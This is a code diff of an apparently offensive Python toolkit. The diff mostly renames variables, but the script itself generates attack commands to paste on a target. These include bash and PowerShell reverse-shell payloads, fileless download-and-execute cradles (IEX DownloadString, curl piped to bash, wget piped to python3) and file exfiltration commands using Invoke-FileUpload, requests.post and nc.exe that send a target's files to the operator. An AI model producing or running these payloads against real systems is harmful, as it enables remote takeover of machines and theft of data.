@@ -1,17 +1,17 @@
 #!/usr/bin/env python
 
 import os
-import sys
+from sys import exit, path
 import argparse
 import subprocess
 import random
 import hashlib
 import string
-import time
+from time import sleep
 import urllib.request
 from getpass import getpass
 
-sys.path.append('modules')
+path.append('modules')
 import uploadfrom
 import uploadto
 import helpers
@@ -99,38 +99,18 @@ def get_absolute_path():
         file_absolute_path = input()
         return file_absolute_path
     except KeyboardInterrupt:
-        sys.exit(0)
-
-# START HTTP SERVER AND CREATE COPY OF FILE TO BE TRANSFERRED
-def start_http_server(listen_ip, listen_port, relpath):
-    print('[+] Starting HTTP server on ' + listen_ip + ':443 ...')
-    try:
-        pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print('[+] HTTP server succesfully started')
-    except KeyboardInterrupt:
-        pyserver.terminate()
-        sys.exit(0)
-    except:
-        print('[!] Failed to start HTTP server')
-        sys.exit(1)
-
-    # COPY FILE TO BE TRANSFERRED TO CURRENT DIRECTORY
-    cmd = 'cp ' + relpath + ' tmp'
-    try:
-        subprocess.run(cmd, shell=True)
-    except:
-        print('[!] Could not temporarily copy file to current directory')
+        exit(0)
 
 # STOP HTTP SERVER AND DELETE COPY OF FILE TO BE TRANSFERRED
-def terminate_http_server():
+def stopHTTP():
     # TERMINATE HTTP SERVER
     print('[?] Close HTTP server? [Y/n] ', end='')
-    time.sleep(1)
+    sleep(1)
     try:
         subterminate = input().lower()
     except KeyboardInterrupt:
         pyserver.terminate()
-        sys.exit(0)
+        exit(0)
     if subterminate == '':
         subterminate = 'y'
     if subterminate == 'n':
@@ -226,36 +206,36 @@ def verify_hash(relpath):
         else:
             print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
     except KeyboardInterrupt:
-        sys.exit(0)
+        exit(0)
 
 # CREATE A REVERSE, BIND, OR WEB SHELL PAYLOAD
 def create_payload(args):
     if args.shell == 'bind':
         print('[?] Target IP: ', end='')
-        listen_ip = input()
+        listenIP = input()
     else:
-        listen_ip = helpers.whichIP()
+        listenIP = helpers.whichIP()
     print('[?] Listening Port [default=random]: ', end='')
     try:
-        listen_port = input()
+        listenPort = input()
     except KeyboardInterrupt:
-        sys.exit(0)
-    if listen_port == '':
-        listen_port = 'random'
-    if listen_port == 'random':
+        exit(0)
+    if listenPort == '':
+        listenPort = 'random'
+    if listenPort == 'random':
         random_port = random.randint(1024, 49151)
-        listen_port = str(random_port)
-    print('[+] Using port ' + listen_port)
+        listenPort = str(random_port)
+    print('[+] Using port ' + listenPort)
     print('[+] Creating payload ...')
     # CHECK PAYLOAD OS
     if args.shell == 'reverse':
         if args.os == 'linux':
             print('\n[===== LINUX PAYLOAD =====]\n')
-            print('bash -c \'bash -i >& /dev/tcp/' + listen_ip + '/' + listen_port + ' 0>&1\'')
+            print('bash -c \'bash -i >& /dev/tcp/' + listenIP + '/' + listenPort + ' 0>&1\'')
             print('\n[=== END LINUX PAYLOAD ===]\n')
         elif args.os == 'windows':
             print('\n[===== WINDOWS PAYLOAD =====]\n')
-            print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + listen_ip + '\',' + listen_port + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
+            print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + listenIP + '\',' + listenPort + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
             print('\n[=== END WINDOWS PAYLOAD ===]\n')
 
         # PROMPT FOR LISTENER
@@ -264,7 +244,7 @@ def create_payload(args):
 
         # START LISTENER
         if run_listener == '' or run_listener[0] == 'y':
-            services.startListener(listen_ip, listen_port)
+            services.startListener(listenIP, listenPort)
         else:
             print('[-] No listener was started')
     elif args.shell == 'bind':
@@ -295,10 +275,7 @@ def upload_to(args):
         ### WINDOWS HTTP METHOD ###
         ###########################
         if method == 'HTTP':
-            listen_ip = helpers.whichIP()
-            listen_port = '443'
-
-            start_http_server(listen_ip, listen_port, relpath)
+            proc, listenIP, listenPort = services.startHTTP()
             
             # PASTABLES
             entrymsg = '[+] Select windows target download method:'
@@ -310,33 +287,33 @@ def upload_to(args):
                     sync = input().lower()
                 except KeyboardInterrupt:
                     pyserver.terminate()
-                    sys.exit(0)
+                    exit(0)
                 if sync == '':
                     sync = 'sync'
                 if sync == 'async':
                     print('[+] Using Asynchronous DownloadFile')
-                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\',\'' + rand_filename + '\')'
+                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'http://' + listenIP + ':' + listenPort + '/' + args.filename + '\',\'' + rand_filename + '\')'
                     endcmd = ''
                 elif sync == 'sync':
                     print('[+] Using Synchronous DownloadFile')
-                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\',\'' + rand_filename + '\')'
+                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'http://' + listenIP + ':' + listenPort + '/' + args.filename + '\',\'' + rand_filename + '\')'
                     endcmd = ''
             elif choice == 'DownloadString - Fileless':
                 print('[+] DownloadString - Fileless method selected')
                 choice = random.randint(1, 2)
                 if choice == '1':
-                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename + '\')'
+                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + listenIP + ':' + listenPort + '/' + args.filename + '\')'
                     endcmd = ''
                 else:
-                    startcmd = '(New-Object Net.WebClient).DownloadString(\'http://' + listen_ip + ':' + listen_port + '/' + args.filename
+                    startcmd = '(New-Object Net.WebClient).DownloadString(\'http://' + listenIP + ':' + listenPort + '/' + args.filename
                     endcmd = '\') | IEX'
             elif choice == 'Invoke-WebRequest':
                 print('[+] Invoke-WebRequest method selected')
-                startcmd = 'Invoke-WebRequest http://' + listen_ip + ':' + listen_port + '/' + args.filename
+                startcmd = 'Invoke-WebRequest http://' + listenIP + ':' + listenPort + '/' + args.filename
                 endcmd = ' -OutFile ' + rand_filename
             elif choice == 'Invoke-WebRequest - Fileless':
                 print('[+] Invoke-WebRequest - Fileless method selected')
-                startcmd = 'Invoke-WebRequest http://' + listen_ip + ':' + listen_port + '/' + args.filename
+                startcmd = 'Invoke-WebRequest http://' + listenIP + ':' + listenPort + '/' + args.filename
                 endcmd = ' | IEX'
             elif choice == 'JavaScript':
                 print('[+] JavaScript method selected')
@@ -349,7 +326,7 @@ def upload_to(args):
                 cmd += '\$file = \'BinStream.Write(WinHttpReq.ResponseBody);\'\n'
                 cmd += '\$file = \'BinStream.SaveToFile(WScript.Arguments(1));\''
                 cmd += '\$file | Out-File get.js;'
-                cmd += 'cscript.exe /nologo get.js http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
+                cmd += 'cscript.exe /nologo get.js http://' + listenIP + ':' + listenPort + '/' + args.filename + ' ' + args.filename
             elif choice == 'VBScript':
                 print('[+] VBScript method selected')
                 cmd = '\$file = \'dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\'\n'
@@ -363,14 +340,14 @@ def upload_to(args):
                 cmd += '\$file = \'    .savetofile WScript.Arguments.Item(1), 2\'\n'
                 cmd += '\$file = \'end with\';'
                 cmd += '\$file | Out-File get.vbs'
-                cmd += 'cscript.exe /nologo get.vbs http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' ' + args.filename
+                cmd += 'cscript.exe /nologo get.vbs http://' + listenIP + ':' + listenPort + '/' + args.filename + ' ' + args.filename
 
             else:
                 print('[!] Invalid choice')
             cmd = startcmd + endcmd
+            os.link(relpath, '/tmp/webroot/' + args.filename)
             helpers.pasta(cmd)
-
-            terminate_http_server()
+            services.stopHTTP(proc)
 
             # if args.firstlaunch:
             #     command = startcmd + ' -UseBasicParsing' + endcmd
@@ -390,7 +367,7 @@ def upload_to(args):
             cmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64 + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
             if len(cmd) > 8191:
                 print('[!] cmd.exe has a maximum string length of 8,191 characters.')
-                sys.exit(0)
+                exit(0)
 
             verify_hash(relpath)
 
@@ -469,38 +446,40 @@ def upload_to(args):
         ### LINUX HTTP METHOD ###
         #########################
         elif method == 'HTTP' or method == 'HTTP - Fileless':
-            listen_ip = helpers.whichIP()
-            listen_port = '443'
+            proc, listenIP, listenPort = services.startHTTP()
 
-            entrymsg = '[+] Select windows target download method:'
+            entrymsg = '[+] Select linux target download method:'
             choice = helpers.populateChoices(entrymsg, Download_Methods)
+
             if choice == 'cURL':
                 if method == 'HTTP':
-                    cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
-                    cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' -o ' + args.filename
+                    cmd = '# DOWNLOAD ' + args.filename.upper() + ' ON TARGET\n'
+                    cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + args.filename + ' -o ' + args.filename
                 elif method == 'HTTP - Fileless':
                     entrymsg = '[+] Select file type being uploaded:'
                     choice = helpers.populateChoices(entrymsg, Fileless_Types)
                     cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                     if choice == 'BASH script (.sh)':
-                        cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
+                        cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | bash'
                     elif choice == 'Python script (.py)':
-                        cmd += 'curl http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'
-            if choice == 'wget':
+                        cmd += 'curl http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | python3'
+            elif choice == 'wget':
                 if method == 'HTTP':
-                    cmd = '# CREATE ' + args.filename.upper() + ' ON TARGET\n'
-                    cmd += 'wget http://' + listen_ip + ':' + listen_port + '/' + args.filename
+                    cmd = '# DOWNLOAD ' + args.filename.upper() + ' ON TARGET\n'
+                    cmd += 'wget http://' + listenIP + ':' + listenPort + '/' + args.filename
                 elif method == 'HTTP - Fileless':
                     entrymsg = '[+] Select file type being uploaded:'
                     choice = helpers.populateChoices(entrymsg, Fileless_Types)
                     cmd = '# EXECUTE ' + args.filename.upper() + ' ON TARGET\n'
                     if choice == 'BASH script (.sh)':
-                        cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | bash'
+                        cmd += 'wget -qO- http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | bash'
                     elif choice == 'Python script (.py)':
-                        cmd += 'wget -qO- http://' + listen_ip + ':' + listen_port + '/' + args.filename + ' | python3'
+                        cmd += 'wget -qO- http://' + listenIP + ':' + listenPort + '/' + args.filename + ' | python3'
+            else:
+                print('[!] Not yet implemented')
 
-            start_http_server(listen_ip, listen_port, relpath)
-            terminate_http_server()
+            helpers.pasta(cmd)
+            services.stopHTTP(proc)
 
         ########################
         ### LINUX SCP METHOD ###
@@ -557,12 +536,12 @@ def upload_from(args):
                 try:
                     b64 = input()
                 except KeyboardInterrupt:
-                    sys.exit(0)
+                    exit(0)
                 print('[?] Paste generated MD5 checksum here: ', end='')
                 try:
                     md5_target_hash = input()
                 except KeyboardInterrupt:
-                    sys.exit(0)
+                    exit(0)
                 cmd = 'echo \'' + b64 + '\' | base64 -d > ' + filename
                 create_file = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
                 create_file.wait()
@@ -577,23 +556,23 @@ def upload_from(args):
                     try:
                         input('[*] Press any key to try again ...')
                     except KeyboardInterrupt:
-                        sys.exit(0)
+                        exit(0)
 
         ###################################
         ### WINDOWS UPLOADSERVER METHOD ###
         ###################################
         elif method == 'UploadServer':
             # START UPLOADSERVER
-            listen_ip = helpers.whichIP()
-            print('[+] Starting upload server on ' + listen_ip + ':443 ...')
+            listenIP = helpers.whichIP()
+            print('[+] Starting upload server on ' + listenIP + ':443 ...')
             try:
-                uploadserver = subprocess.Popen(['python3', '-m', 'uploadserver', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                uploadserver = subprocess.Popen(['python3', '-m', 'uploadserver', '-b', listenIP, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 print('[+] Upload server successfully started')
             except KeyboardInterrupt:
-                sys.exit(0)
+                exit(0)
             except:
                 print('[!] Failed to start upload server')
-                sys.exit(1)
+                exit(1)
 
             # GET FILENAME AND ABSOLUTE PATH ON TARGET
             file_absolute_path = get_absolute_path()
@@ -608,21 +587,21 @@ def upload_from(args):
                 cmd = '# DOWNLOAD PSUPLOAD.PS1\n'
                 cmd += 'IEX(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1\')\n'
                 cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
-                cmd += 'Invoke-FileUpload -Uri https://' + listen_ip + '/upload -File ' + file_absolute_path
+                cmd += 'Invoke-FileUpload -Uri https://' + listenIP + '/upload -File ' + file_absolute_path
             elif choice == 'Base64':
                 cmd = '# GENERATE BASE64 AND STORE IT AS A VARIABLE\n'
                 cmd += '$b64 = [System.convert]::ToBase64String((Get-Content -Path \'' + file_absolute_path + '\' -Encoding Byte))\n'
                 cmd += '\n# UPLOAD ' + filename.upper() + ' TO UPLOAD SERVER\n'
-                cmd += 'Invoke-WebRequest -Uri https://' + listen_ip + '/ -Method POST -Body $b64'
+                cmd += 'Invoke-WebRequest -Uri https://' + listenIP + '/ -Method POST -Body $b64'
             elif choice == 'Python 3':
-                cmd = 'python3 -c \'import requests;requests.post("http://' + listen_ip + ':443/upload",files={"files":open("' + file_absolute_path + '","rb")})\''
+                cmd = 'python3 -c \'import requests;requests.post("http://' + listenIP + ':443/upload",files={"files":open("' + file_absolute_path + '","rb")})\''
             elif choice == 'Python 2.7':
-                cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve ("http://' + listen_ip + ':443/upload",' + args.url.split('/')[-1] + ')\''
+                cmd = 'python2.7 -c \'import urllib;urllib.urlretrieve ("http://' + listenIP + ':443/upload",' + args.url.split('/')[-1] + ')\''
             helpers.pasta(cmd)
 
             # TERMINATE UPLOAD SERVER WHEN DONE
             print('[?] Close upload server? [Y/n] ', end='')
-            time.sleep(1)
+            sleep(1)
             subterminate = input().lower()
             if subterminate == '':
                 subterminate = 'y'
@@ -639,21 +618,21 @@ def upload_from(args):
         ### WINDOWS NETCAT METHOD ###
         #############################
         elif method == 'Netcat':
-            listen_ip = helpers.whichIP()
+            listenIP = helpers.whichIP()
             cmd = 'nc -l -p 443 > ' + args.filename
             try:
                 try:
                     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                    print('[+] Netcat listener is started on ' + listen_ip + ':443')
+                    print('[+] Netcat listener is started on ' + listenIP + ':443')
                 except:
                     print('[!] Failed to start Netcat listener')
-                cmd = 'nc.exe ' + listen_ip + ' 443 < ' + relpath
+                cmd = 'nc.exe ' + listenIP + ' 443 < ' + relpath
                 helpers.pasta(cmd)
                 print('[?] Press Ctrl+C to cancel transfer ...')
                 proc.wait()
             except KeyboardInterrupt:
                 proc.terminate()
-                sys.exit(0)
+                exit(0)
 
 
     #########################
@@ -679,7 +658,7 @@ def encrypt_file(args):
         proc = subprocess.run(cmd.split())
 
     except KeyboardInterrupt:
-        sys.exit(0)
+        exit(0)
 
 # CRACK PASSWORDS
 def password_crack(args):
